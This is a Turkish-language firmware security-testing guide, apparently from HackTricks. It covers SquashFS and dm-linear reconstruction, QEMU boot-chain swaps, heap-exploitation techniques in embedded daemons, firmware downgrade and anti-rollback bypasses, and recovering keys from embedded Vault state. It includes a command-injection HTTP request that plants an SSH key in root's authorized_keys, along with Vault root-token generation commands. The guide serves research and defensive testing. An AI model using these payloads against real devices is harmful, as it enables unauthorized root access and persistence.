Bir SquashFS superblock'u okunabiliyor ancak inode, dizin veya fragment tablosu offset'leri olanaksız görünüyorsa, hemen `unsquashfs`'i yamalamayın. Erken açılış binary'sini tersine mühendislikle inceleyin ve oluşturduğu block-device grafiğini yeniden oluşturun: gömülü sistemler nominal bir root partition sunabilir, ancak gerçek dosya sistemini başka bir partition'dan alınan sektörleri ekleyen bir `dm-linear` eşlemesiyle oluşturabilir. Yalnızca superblock'u kontrol etmek başarılı olabilir; buna rağmen sonraki tüm metadata blokları yanlış yerde olabilir.<sup>[[11]](#references)</sup>

Firmware'in aritmetiğini aynen koruyun. Özellikle uzunlukların byte, 512-byte sektör veya 4 KiB sayfa cinsinden olup olmadığını belirleyin; shift ve truncation işlemlerini orijinal sıralarıyla yeniden uygulayın ve A/B düzenlerindeki bankaya bağlı kuyruk bölgelerini hesaba katın. Örneğin `(partition_bytes >> 12) << 3` önce 4 KiB sınırına göre truncation yapar, sonra sonucu 512-byte sektör cinsinden ifade eder; bunu `partition_bytes // 512` ile değiştirmek, eklenen extent'i birkaç kilobyte kaydırabilir ve sonraki tüm SquashFS tablolarını bozabilir.<sup>[[11]](#references)</sup>

Faydalı bir doğrulama iş akışı:<sup>[[11]](#references)</sup>

1. Doğrulayıcı/init binary'sinden her `dm-linear` segmentinin kaynak cihazını, başlangıç sektörünü ve uzunluğunu çıkarın.
2. Hizalama kurallarını değiştirmeden extent'leri birleştirin veya eşleyin.
3. Çıkarma hâlâ başarısız olursa, yalnızca tahmin edilen sınırın yakınındaki küçük bir aralıkta arama yapın ve tek başına makul görünen bir superblock'u kabul etmek yerine art arda gelen birkaç geçerli metadata yapısı arayın.
4. Yeniden oluşturulan image üzerinde değiştirilmemiş bir `unsquashfs` çalıştırın; tüm dizin ve fragment'lerin başarıyla taranması, `unsquashfs -stat` çıktısından daha güçlü bir kanıttır.

#### Analistin denetimindeki dm-verity değişimi

Analist QEMU kernel'ini, initramfs'i ve sanal diskleri denetliyorsa, satıcıya ait doğrulama PID 1'i küçük, statically linked bir init ile değiştirerek değiştirilmiş bir root'u boot edebilir. Bu bir **lab boot-chain değişimidir**; dm-verity'nin, RSA signature'ının, Secure Boot'un veya TPM ile mühürlenmiş bir anahtarın kırılması değildir.<sup>[[11]](#references)</sup>

Yeni init, orijinal boot yolunun işlevsel kısımlarını taklit etmelidir: `devtmpfs`'i mount etmek, `setsid()` çağırmak, `/dev/console`'ı 0–2 file descriptor'larına bağlamak, `/proc` ve `/sys`'i mount etmek, sağlanan block device'ın hazır olmasını beklemek, düzenlenmiş root'u salt okunur olarak mount etmek, eski root'un pseudo-filesystem'lerini ayırmak, yeni mount'u `/` üzerine taşımak, `chroot` yapmak ve firmware'in orijinal `/sbin/init` dosyasını `execve()` ile çalıştırmak. `/dev`, `/proc` ve `/sys`'i `MS_MOVE` işleminden **önce** ayırmak, yeni root'a ait mount noktalarının yanlışlıkla ayrılmasını önler.<sup>[[11]](#references)</sup>

Değiştirilebilir cihaz durumunu değiştirilmiş, salt okunur root'tan ayrı tutun. qcow2 overlay, orijinal diskin LVM durumunu korurken ikinci bir salt okunur virtio disk, düzenlenmiş SquashFS'i sağlayabilir:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Çevrimdışı imaj durumu hata ayıklama

Yavaş açılışlar, yıkıcı başlangıç betikleri veya güvenilmez konsol günlükleri arızayı gizlediğinde, konuk sistemin dışındaki kalıcı durumu inceleyin. Çalışan bir VM'nin kullandığı overlay'i asla bağlamayın; `qemu-nbd` ile erişime açın, LVM keşfini hedeflenen NBD bölümüne kısıtlayın ve bağlantıyı kesmeden önce volume group'u devre dışı bırakın.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Tekrarlanabilir hata izolasyonu için, zaman damgalı işaretçi dosyalarını yazılabilir ve kalıcı bir birime yazın ve bunları çevrimdışı doğrulayın; `/dev/kmsg`, FIFO’lar ve geçici konsollar, hız sınırlaması veya sürecin erken sonlanması nedeniyle yanlış negatif sonuçlara yol açabilir. Ayrıca, ilgisiz kodları değiştirmeden önce katmanlar arasındaki arayüzleri birebir karşılaştırın: `uname -r` ile `/lib/modules/`, diskteki ext4 özellikleri ile kernel yapılandırması ve Mesa `libGL` nesli ile DRI driver ABI’si ve PCI’dan türetilen driver adları. Bir bileşen mevcut olabilir ve hatta `dlopen()` ile başarıyla yüklenebilir; ancak onu kullanan bileşen farklı bir ABI beklediği için yine de kullanılamaz durumda olabilir.<sup>[[11]](#references)</sup>

## Uygulamada Dinamik Analiz

Bu aşamada analiz için gerçek veya emüle edilmiş bir cihaz ortamı kullanılır. İşletim sistemine ve dosya sistemine shell erişimini sürdürmek çok önemlidir. Emülasyon donanım etkileşimlerini kusursuz biçimde taklit etmeyebilir; bu nedenle emülasyonu zaman zaman yeniden başlatmak gerekebilir. Analizde dosya sistemi yeniden incelenmeli, dışarıya açık web sayfaları ve ağ servisleri exploit edilmeli ve bootloader zafiyetleri araştırılmalıdır. Olası backdoor zafiyetlerini belirlemek için firmware bütünlük testleri kritik öneme sahiptir.

## Çalışma Zamanı Analiz Teknikleri

Çalışma zamanı analizi, bir süreç veya binary ile çalıştığı ortamda etkileşim kurmayı içerir. Bu amaçla, breakpoint’ler ayarlamak ve fuzzing ile diğer teknikleri kullanarak zafiyetleri belirlemek için gdb-multiarch, Frida ve Ghidra gibi araçlardan yararlanılır.

Tam bir debugger bulunmayan gömülü hedeflerde, **statik olarak bağlanmış bir `gdbserver`’ı cihaza kopyalayın** ve uzaktan bağlanın:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor mesaj eşlemesi

IoT hub’larda RF stack’i genellikle bir **radio MCU** ile Linux userland process’i arasında bölünür. İzlenecek yol şu şekilde eşleştirilebilir:<sup>[[8]](#references)</sup>

1. Havadaki **RF frame**
2. Radio MCU’daki **controller-side parser**
3. Linux’a iletilen **serial/UART text veya TLV protocol** (örneğin `/dev/tty*`)
4. Ana daemon’daki **application dispatcher**
5. **Protocol-specific handler / state machine**

Bu mimari, tek bir hedef yerine iki tersine mühendislik hedefi oluşturur. Controller, binary radio frame’leri `Group,Command,arg1,arg2,...` gibi bir textual protocol’e dönüştürüyorsa şunları ortaya çıkarın:

- **Message group**’lar ve dispatch table’lar
- Hangi mesajların **network**’ten, hangilerinin doğrudan controller’dan gelebileceği
- Tam **manufacturer-specific discriminator field**’lar (örneğin Zigbee `manufacturer_code` ve özel `cluster_command`)
- Hangi handler’lara yalnızca **commissioning**, discovery veya firmware/model download aşamalarında erişilebildiği

Özellikle Zigbee için pairing trafiğini yakalayın ve hedefin hâlâ varsayılan **Link Key** `ZigBeeAlliance09` değerini kullanıp kullanmadığını kontrol edin. Kullanıyorsa, commissioning trafiğini dinlemek **Network Key**’i açığa çıkarabilir. Zigbee 3.0 install code’ları bu riski azaltır; bu nedenle test edilen cihazın bunları gerçekten zorunlu kılıp kılmadığını not edin.

### Üreticiye özel protocol handler’ları ve FSM ile kısıtlanmış erişilebilirlik

Üreticiye özel Zigbee/ZCL command’ları, standartlaştırılmış cluster’lardan genellikle daha iyi bir hedeftir; çünkü daha az sınanmış doğrulamaya sahip **custom parsing code** ve dahili **FSM**’lere ulaşırlar.<sup>[[8]](#references)</sup>

Uygulanabilir iş akışı:

- **Vendor-only handler**’ı bulana kadar command dispatcher’ı tersine mühendislikle inceleyin.
- **FSM state**, **event**, **check**, **action** ve **next-state** table’larını ortaya çıkarın.
- Otomatik ilerleyen **transitional state**’leri ve sonunda attacker-controlled state’i sıfırlayan veya serbest bırakan retry/error branch’lerini belirleyin.
- Hatalı handler’ın her zaman erişilebilir olduğunu varsaymak yerine, daemon’ı savunmasız duruma getirmek için gereken meşru protocol alışverişlerini doğrulayın.

Zamanlamaya duyarlı protocol’lerde Python framework’üyle packet replay yapmak fazla yavaş olabilir. Daha güvenilir bir yaklaşım, doğru **endpoint**’leri, **attribute**’ları ve commissioning zamanlamasını sağlayabilmek için gerçek donanımda (örneğin bir **nRF52840**) vendor-grade stack kullanan meşru bir cihazı emüle etmektir.

### Embedded daemon’larda parçalı indirme hatası sınıfı

**Fragmented blob/model/configuration download** işlemlerinde tekrarlayan bir firmware hatası sınıfı görülür:<sup>[[8]](#references)</sup>

1. **İlk fragment** (`offset == 0`), `ctx->total_size` değerini kaydeder ve `malloc(total_size)` ile bellek ayırır.
2. Sonraki fragment’ler yalnızca `packet_total_size >= offset + chunk_len` gibi attacker-controlled **packet-local** field’ları doğrular.
3. Kopyalama işlemi, **başlangıçta ayrılan boyuta** karşı kontrol yapılmadan `memcpy(&ctx->buffer[offset], chunk, chunk_len)` çağrısını kullanır.

Bu, saldırganın şunları göndermesine olanak tanır:

- Küçük bir heap allocation yapılmasını sağlamak için **küçük** bir bildirilmiş total size içeren geçerli bir ilk fragment.
- **Beklenen offset** değerine, ancak daha büyük bir `chunk_len` değerine sahip sonraki bir fragment.
- Yeni kontrolleri geçerken başlangıçta ayrılan buffer’ı taşıran, sahte bir packet-local size.

Savunmasız yol commissioning logic’inin arkasındaysa, exploit için hatalı fragment’leri göndermeden önce hedefi beklenen model-download veya blob-download durumuna sokacak yeterli **device emulation** gerekir.

### Protocol ile tetiklenen `free()` işlemleri

Embedded daemon’larda heap metadata exploitation’ı tetiklemenin en kolay yolu çoğu zaman “cleanup’ı beklemek” değil, **protocol’ün kendi error handling mekanizmasını zorlamaktır**:<sup>[[8]](#references)</sup>

- FSM’i **retry** veya **error** state’lerine geçirmek için hatalı follow-up fragment’ler gönderin.
- Daemon’ın **context’i sıfırlayıp** bozulmuş buffer’ı serbest bırakması için retry eşiğini aşın.
- Process’in ilgisiz nedenlerle çökmesinden önce allocator-side primitive’leri tetiklemek için bu öngörülebilir `free()` işlemini kullanın.

Bu yöntem, özellikle embedded Linux’taki **musl/uClibc/dlmalloc benzeri** allocator’lara karşı kullanışlıdır; chunk metadata’sının bozulması, unlink/unbin logic’ini bir write primitive’e dönüştürebilir. Kararlı bir yöntem, gerçek bin pointer’larını hemen ezip process’i çökertmek yerine **size field**’ını bozarak allocator traversal’ını taşmış buffer’ın içine yerleştirilmiş **fake chunk**’lara yönlendirmektir.

## Binary Exploitation ve Proof-of-Concept

Belirlenen vulnerability’ler için PoC geliştirmek, hedef mimarisini derinlemesine anlamayı ve daha düşük seviyeli dillerde programlama yapmayı gerektirir. Embedded system’lerde binary runtime protection’lar nadirdir; ancak mevcut olduklarında Return Oriented Programming (ROP) gibi teknikler gerekebilir.

### uClibc fastbin exploitation notları (embedded Linux)

- **Fastbin’ler + consolidation:** uClibc, glibc’e benzer fastbin’ler kullanır. Daha sonra yapılan büyük bir allocation `__malloc_consolidate()` işlemini tetikleyebilir. Bu nedenle fake chunk, kontrolleri geçmelidir (makul bir size, `fd = 0` ve çevresindeki chunk’ların “in use” olarak görülmesi).<sup>[[6]](#references)</sup>
- **ASLR altında non-PIE binary’ler:** ASLR etkin ancak ana binary **non-PIE** ise, binary içindeki `.data/.bss` adresleri sabittir. Fastbin allocation’ını bir **function pointer table** üzerine yönlendirmek için zaten geçerli bir heap chunk header’ına benzeyen bir bölgeyi hedefleyebilirsiniz.
- **Parser’ı durduran NUL:** JSON parse edilirken payload içindeki bir `\x00`, trailing attacker-controlled byte’ları stack pivot/ROP chain için kullanılabilir durumda bırakırken parsing’i durdurabilir.
- **`/proc/self/mem` ile shellcode:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağıran bir ROP chain, çalıştırılabilir shellcode’u bilinen bir mapping’e yerleştirip oraya atlayabilir.

## Firmware Analysis için Hazır İşletim Sistemleri

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi işletim sistemleri, firmware security testing için gerekli araçlarla donatılmış, önceden yapılandırılmış ortamlar sağlar.

## Firmware Analizi için Hazır OS’ler

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarında security assessment ve penetration testing yapmanıza yardımcı olmak üzere tasarlanmış bir dağıtımdır. Gerekli tüm araçların yüklü olduğu, önceden yapılandırılmış bir ortam sunarak size zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Firmware security testing araçları önceden yüklenmiş, Ubuntu 18.04 tabanlı embedded security testing işletim sistemi.

## Firmware Downgrade Attacks ve Güvensiz Update Mechanism’leri

Bir üretici firmware image’ları için cryptographic signature check uygulasa bile, **version rollback (downgrade) protection** çoğu zaman atlanır. Boot- veya recovery-loader, yalnızca gömülü bir public key ile signature’ı doğruluyor ancak yüklenen image’ın *version* değerini (veya monotonic counter’ını) karşılaştırmıyorsa, saldırgan **geçerli bir signature taşıyan eski ve savunmasız bir firmware’i** yasal olarak yükleyebilir ve böylece yamalanmış vulnerability’leri yeniden kullanılabilir hâle getirebilir.<sup>[[4]](#references)</sup>

Tipik saldırı iş akışı:

1. **Daha eski, imzalı bir image edinin**
   * Üreticinin herkese açık download portal’ından, CDN’inden veya support site’ından alın.
   * Companion mobile/desktop application’lardan çıkarın (ör. bir Android APK içindeki `assets/firmware/` dizininden).
   * VirusTotal, Internet archive’leri, forumlar vb. üçüncü taraf repository’lerden alın.
2. Image’ı açık olan herhangi bir update channel üzerinden cihaza **yükleyin veya sunun**:
   * Web UI, mobile-app API, USB, TFTP, MQTT vb.
   * Birçok tüketici IoT cihazında, Base64 ile kodlanmış firmware blob’larını kabul eden, bunları server-side çözen ve recovery/upgrade işlemini başlatan *unauthenticated* HTTP(S) endpoint’leri bulunur.
3. Downgrade sonrasında, daha yeni sürümde yamalanmış bir vulnerability’yi exploit edin (örneğin sonradan eklenen bir command-injection filter).
4. Persistence sağlandıktan sonra tespit edilmemek için isteğe bağlı olarak en güncel image’ı yeniden flash edin veya update’leri devre dışı bırakın.

### Örnek: Downgrade Sonrası Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Güvenlik açığı bulunan (downgrade edilmiş) firmware'de `md5` parametresi temizlenmeden doğrudan bir shell komutuna eklenir ve böylece rastgele komutların enjekte edilmesine olanak tanır (burada SSH anahtarı tabanlı root erişimi sağlamak için). Daha sonraki firmware sürümlerinde temel bir karakter filtresi eklendi, ancak downgrade korumasının bulunmaması düzeltmeyi etkisiz kılıyor.<sup>[[4]](#references)</sup>

### Mobil Uygulamalardan Firmware Çıkarma

Birçok üretici, uygulamanın cihazı Bluetooth/Wi-Fi üzerinden güncelleyebilmesi için tam firmware imajlarını yardımcı mobil uygulamalarının içine ekler. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi yollar altında şifrelenmemiş olarak saklanır. `apktool`, `ghidra` gibi araçlar, hatta düz `unzip` bile fiziksel donanıma dokunmadan imzalı imajları çıkarmanıza olanak tanır.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot tasarımlarında yalnızca updater tarafındaki anti-rollback korumasını aşma

Bazı üreticiler anti-downgrade **ratchet** uygular, ancak bunu yalnızca *updater* mantığında kullanır (örneğin CAN üzerinden bir UDS rutini, bir recovery komutu veya userspace OTA agent). **Bootloader** daha sonra yalnızca image signature/CRC denetimi yapıp partition table ya da slot metadata bilgisine güveniyorsa rollback koruması yine de aşılabilir.<sup>[[7]](#references)</sup>

Tipik zayıf tasarım:

- Firmware metadata’sı hem bir version descriptor hem de bir **security ratchet** / monotonic counter içerir.
- Updater, image ratchet değerini persistent storage’da kayıtlı bir değerle karşılaştırır ve daha eski imzalı image’ları reddeder.
- Bootloader bu **ratchet** değerini **parse** etmez; yalnızca seçili slotu başlatmadan önce header, CRC ve signature değerlerini doğrular.
- Slot aktivasyonu, partition table’da veya slot başına tutulan bir generation counter’da ayrı olarak saklanır ve doğrulanan firmware’in tam digest değerine **cryptographically bound** değildir.

Bu durum, dual-slot sistemlerde **bir image’ı doğrula / başka bir image’ı başlat** primitive’ini oluşturur. Saldırgan, güncel ve imzalı bir image kullanarak updater’a slot B’yi sonraki boot hedefi olarak işaretletebiliyor ve ardından yeniden başlatmadan önce slot B’nin üzerine yazabiliyorsa bootloader, önceden commit edilmiş slot metadata’sına güvendiği için eski image’ı başlatabilir.

Yaygın kötüye kullanım yöntemi:

1. Pasif slota **güncel ve imzalı** bir firmware yükleyin ve normal doğrulama/değiştirme rutinini çalıştırarak bu slotun sonraki etkin slot olarak işaretlenmesini sağlayın.
2. **Henüz yeniden başlatmayın**. Aynı oturumda slot hazırlama/silme rutinini yeniden çağırın.
3. Updater’ın, az önce öne alınan **aynı fiziksel slotu** silmesini sağlamak için eski boot-state veya eski slot-selection mantığını kötüye kullanın.
4. Bu slota **daha eski ama hâlâ imzalı** bir firmware yazın.
5. Ratchet’i uygulayan doğrulama rutinini atlayıp doğrudan yeniden başlatın.
6. Bootloader öne alınan slotu seçer, yalnızca signature/integrity kontrolü yapar ve eski image’ı başlatır.

A/B update uygulamalarını reverse ederken dikkat edilmesi gerekenler:

- Slot seçiminin, başarılı bir değiştirme işleminden sonra yenilenmeyen **boot-time flag**’lerden türetilmesi.
- `prepare_passive_slot()` benzeri bir rutinin, **mevcut commit edilmiş layout** yerine eski duruma göre slot silmesi.
- `part_write_layout()` benzeri bir fonksiyonun, doğrulanmış image hash değerini kaydetmeden yalnızca **generation counter** / etkin flag değerini artırması.
- Ratchet kontrollerinin userspace veya updater kodunda uygulanıp ROM / bootloader / secure boot aşamalarında **uygulanmaması**.
- Slotun içeriği silinip yeniden yazıldıktan sonra bile slotu bootable olarak işaretli bırakan silme veya recovery rutinleri.

### Update Logic’i Değerlendirme Kontrol Listesi

* *Update endpoint*’in taşıma/güvenlik doğrulama mekanizması yeterince korunuyor mu (TLS + authentication)?
* Cihaz, flashing işleminden önce **version number** veya **monotonic anti-rollback counter** değerini karşılaştırıyor mu?
* Image, secure boot chain içinde doğrulanıyor mu (ör. signature’lar ROM code tarafından kontrol ediliyor mu)?
* **Bootloader**, yalnızca signature/CRC kontrol etmek yerine updater ile **aynı ratchet’i** uygulıyor mu?
* Slot aktivasyon metadata’sı **doğrulanmış firmware digest/version değerine bağlı mı**, yoksa slot öne alındıktan sonra değiştirilebiliyor mu?
* Slot değişikliği başarılı olduktan sonra cihazın yeniden başlatılması zorunlu mu, yoksa aynı oturumda sonraki update/silme rutinlerine hâlâ erişilebiliyor mu?
* Userland kodu ek sanity check’ler yapıyor mu (ör. izin verilen partition map, model number)?
* *Partial* veya *backup* update akışları aynı doğrulama mantığını yeniden kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse platform muhtemelen rollback saldırılarına karşı savunmasızdır.

## Pratik yapmak için savunmasız firmware’ler

Firmware’deki güvenlik açıklarını bulma pratiği yapmak için aşağıdaki savunmasız firmware projelerini başlangıç noktası olarak kullanın.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state’inden firmware decryption key’lerini kurtarma

Bir update image’ı az miktarda plaintext metadata’yı büyük, yüksek entropili bir blob ile birleştiriyorsa herhangi bir brute-force denemeden önce container incelemesi yapın:<sup>[[1]](#references)</sup>

- Header’ları, offset’leri ve satır sınırlarını `hexdump`, `xxd`, `strings -tx`, `base64 -d` ve `binwalk -E` ile dökümleyin.
- `Salted__` genellikle OpenSSL `enc` formatını belirtir: sonraki 8 byte salt, geri kalan byte’lar ise ciphertext’tir.
- Tam olarak `256` byte’a çözülen bir Base64 alanı, muhtemelen rastgele bir firmware password/session key’i saran bir RSA-2048 ciphertext’e baktığınıza dair güçlü bir ipucudur.
- Aynı dosyadaki detached PGP materyali çoğu zaman yalnızca authenticity’yi korur; bunun confidentiality mekanizması olduğunu varsaymayın.

Statik key arama (`grep`, `strings`, PEM/PGP aramaları) sonuç vermezse yalnızca private key’leri aramak yerine **operational decrypt path**’i reverse edin:

- Updater / management binary’sini decompile edin ve şifrelenmiş blob’u kimin okuduğunu, hangi helper/API’nin bu blob’un şifresini çözdüğünü ve hangi mantıksal key name’i istediğini izleyin.
- Çıkarılmış root filesystem’de KMS state’i (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) ve unit file’ları ile init script’lerini arayın.
- Plaintext `vault operator unseal ...`, recovery key’leri, bootstrap token’ları veya yerel KMS auto-unseal script’lerini private-key materyaliyle eşdeğer kabul edin.

Cihaz orijinal Vault binary’sini ve storage backend’ini içeriyorsa bu ortamı yeniden oluşturmak genellikle Vault iç işleyişini yeniden uygulamaktan daha kolaydır:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Klonlanmış KMS üzerinde root erişimiyle:

- Transit keys anahtarlarını yalnızca yalıtılmış klonda export edilebilir hâle getirin: `vault write transit/keys/<name>/config exportable=true`
- Unwrap anahtarını dışa aktarın: `vault read transit/export/encryption-key/<name>`
- Kurtarılan RSA key’i, KMS tarafından kullanılan tam padding/hash çiftiyle deneyin. PKCS#1 v1.5 decrypt işleminin ve varsayılan OAEP decrypt işleminin başarısız olması, key’in yanlış olduğunu **kanıtlamaz**; Vault tabanlı birçok akış SHA-256 ile OAEP kullanırken yaygın kütüphaneler varsayılan olarak SHA-1 kullanır.
- Payload `Salted__` ile başlıyorsa, AES-CBC decrypt işlemine geçmeden önce satıcının OpenSSL KDF’sini (`EVP_BytesToKey`, eski cihazlarda genellikle MD5) tam olarak yeniden uygulayın.

Böylece “şifrelenmiş firmware” daha genel bir probleme dönüşür: **cihaz tarafındaki operasyonel key’leri kurtarın, ardından unwrap + KDF parametrelerini çevrimdışı ortamda tam olarak yeniden uygulayın**.

## Eğitim ve Sertifikalar

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude ile Firmware Kırma: Üst Düzey Uzmanlık, Junior Düzeyinde Özerklik](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Güvenlik Testi Metodolojisi](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Pratik IoT Hacking: Nesnelerin İnterneti'ne Saldırmak İçin Kesin Rehber](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Terk Edilmiş Donanımdaki Zero-Day Açıklarından Yararlanma – Trail of Bits blogu](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 Dolarlık Akıllı Bir Cihaz Bana Evinize Erişim Sağladı](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Şimdi mi Gördün: Artık Pwn Edildin](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector'a şarj portu konektöründen saldırmak - Bölüm 2: anti-downgrade korumasını atlatmak](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Yanıp Sönmesini Sağla: Philips Hue Bridge'in Over-the-Air Exploitation'ı](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU'da Tesla OS'ta ROOT Yetkisi - Bölüm 1: Paketi Açma](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel belgeleri - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU'da Tesla OS'ta ROOT Yetkisi - Bölüm 2: Debugging ve Düzeltme](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS Parolaları: Zayıf XOR Şifrelemesi SPI Flash'tan Kurtarmaya Olanak Tanıyor (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS parolası kurtarma araçları](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Donanım Hacking Bilgilerini Tazelemek, Bölüm 2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Cypherock Donanım Cüzdanını Nasıl ve Neden Hack Ettik: Tüm Hikâye](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
